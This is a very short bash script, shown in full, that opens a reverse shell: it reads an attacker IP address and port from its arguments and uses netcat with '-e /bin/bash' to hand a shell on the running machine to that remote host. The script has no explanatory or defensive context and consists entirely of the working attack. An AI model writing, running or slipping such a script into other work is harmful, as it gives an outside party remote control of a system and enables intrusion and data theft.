#!/bin/bash
ATTACKER_IP=$1
PORT=$2

nc $ATTACKER_IP $PORT -e /bin/bash
